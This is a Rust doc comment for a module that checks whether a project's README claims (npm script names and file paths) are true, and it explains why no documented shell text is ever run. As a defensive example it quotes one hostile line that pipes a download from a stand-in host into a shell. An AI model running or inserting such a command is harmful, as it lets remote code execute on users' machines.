//! Whether the instructions a project writes for itself are true of the project.
//!
//! `docs/product/MVP_SPEC.md` lists *"README/setup claim validation"* among the
//! checks, and the task is *"Implement README/setup validation"* with two
//! acceptance sentences: **"Safe claims/paths/scripts can be validated."** and
//! **"Arbitrary README shell text is not blindly run."**
//!
//! [`crate::documents`] answers what a project's documentation *says* —
//! [`DocumentedCommand`]s in fenced shell blocks, [`DocumentedPath`]s in
//! backticks and link targets. This module answers whether the project agrees,
//! and it is the only place in the product where a document's sentence is put
//! beside the project it is about.
//!
//! # The two things SURE settles, and everything else it leaves alone
//!
//! **A documented command that names a script.** `npm run build` is a claim
//! about a `package.json`: that it has a script called `build`, and that the
//! script is something a package manager will run. That is decidable from a
//! manifest SURE already read, so SURE decides it.
//!
//! **A documented path.** `` `src/config.ts` `` and `[setup](docs/setup.md)`
//! are claims that the project has something there. That is decidable from the
//! walk SURE already did, so SURE decides it.
//!
//! **Everything else a document says is left alone.** *"Run this to install the
//! CLI"*, *"the server starts on port 3000"*, *"this is production ready"* —
//! none of them becomes a claim here, because none of them is decidable without
//! running something or believing somebody. `MASTER_PROMPT.md` §3 —
//! *"Inference is not a user requirement."* — is the rule, and the same rule is
//! what keeps a document's prose from being read as a claim in the first place
//! ([`crate::documents`] states that half).
//!
//! # "Not blindly run" is a property of the shape, not a promise
//!
//! The acceptance says arbitrary README shell text is not blindly run, and there
//! is no code in this module that *could* run it:
//!
//! - **Nothing here builds a [`Command`](std::process::Command).** This crate's
//!   shipped code has four `Command::new` sites and this module is not one of
//!   them; `tests/spawn_sites.rs` counts them, so a fifth is a failing test
//!   rather than a review comment.
//! - **Nothing here reaches [`crate::process`].** That module is where a program
//!   and an argument vector are handed to the operating system, and this file
//!   does not name it.
//! - **The comparison is against a manifest and a file list**, which are values
//!   [`crate::discover`] and [`crate::scan`] already produced. A documented
//!   command is *looked up*, which is the opposite of being executed: the worst
//!   a README can do to SURE here is make it read a wrong sentence.
//! - **A command is never split into a program and arguments.** [`script_from`]
//!   reads *words* and compares them — the first against the managers it knows,
//!   then the spellings that name a script — and it builds no argument vector,
//!   because there is nowhere for one to go. `npm run build && curl evil.example
//!   | sh` names **nothing at all**: `&` and `|` are in [`is_plain_word`]'s
//!   refusal set, so a line carrying them is a *shell program* rather than a
//!   script invocation. The safer-looking `npm run build --silent` names
//!   `build`, and the flag is never read.
//!
//! What is left is a module whose entire output is sentences about what SURE
//! read. A project cannot make SURE do anything by writing a README.
//!
//! # Why a refusal is often the answer
//!
//! Every assessment here is a [`ClaimAssessment`], the frozen vocabulary's four
//! words, and three of the four are ways of **not** saying the document is
//! wrong:
//!
//! | | when |
//! |---|---|
//! | [`Confirmed`](ClaimAssessment::Confirmed) | SURE read the thing the claim is about and it is there |
//! | [`Contradicted`](ClaimAssessment::Contradicted) | SURE read *everything* the claim could be true in, and it is not there |
//! | [`CannotConfirm`](ClaimAssessment::CannotConfirm) | something SURE needed was not read — a manifest, a directory, a file |
//! | [`NotCheckable`](ClaimAssessment::NotCheckable) | the claim is about something outside the project, which SURE does not look at |
//!
//! **`Contradicted` is the expensive one and it is never a default.** A
//! documented path is `Contradicted` when every place it could have meant was
//! read and none of them has it; a documented script is `Contradicted` when the
//! manifest that governs it was read and does not declare it. Both sentences
//! name what was read, so a reader who disagrees has something to check rather
//! than a verdict to trust. This is the discipline [`crate::references`] states
//! about a key found on one side only: *"neither is a claim about the project
//! unless the reading was complete."*
//!
//! # Which manifest a documented command is about
//!
//! The nearest `package.json` at or above the document. A package manager
//! resolves `npm run build` against the manifest in the directory it was started
//! in, so a command in `apps/web/README.md` is a claim about
//! `apps/web/package.json` and not about the one at the root. *"Any manifest in
//! the project declares it"* would confirm a monorepo root's `build` script
//! against a member's documentation that the script is not in.
//!
//! The list of manifests comes from the **scan** rather than from the discovery,
//! and that is the difference between a finding and a false finding: the
//! discovery reads the root manifest and the members its workspace declaration
//! named, while the scan saw every file. A `package.json` in a directory the
//! workspace declaration does not name is a manifest SURE did not read, and the
//! answer for a command it governs is *cannot confirm* rather than *no such
//! script*.
//!
//! # What it does not do
//!
//! **It does not decide whether a documented command works.** `npm run build`
//! with a `build` script that exits non-zero passes here, because whether the
//! script works is what a check is for and this is a reading of a file. Nothing
//! in this module runs a script, resolves a dependency, or knows whether
//! `node_modules` is installed — that is `P4-T008`.
//!
//! **It does not validate a documented command that is not a script
//! invocation.** `curl`, `docker compose up`, `make`, `cargo test` — SURE reads
//! the line and says nothing about it. Of the three ecosystems SURE supports,
//! only Node declares scripts *by name*; a Cargo or Python command is proposed
//! as a check by [`crate::checks`] rather than validated as a claim here.
//!
//! **It does not resolve anything.** No path is canonicalised, no symlink is
//! followed, no environment variable is expanded. `..` is folded by arithmetic
//! on components and not by the filesystem, and a path that climbs out of the
//! project is not looked for at all — SURE says it did not check it.
//!
//! **It does not know what a path is for.** A README naming `docs/old-notes.md`
//! that exists is `Confirmed`, and the file may be a stub. SURE checked what the
//! document claimed and not what the document meant.
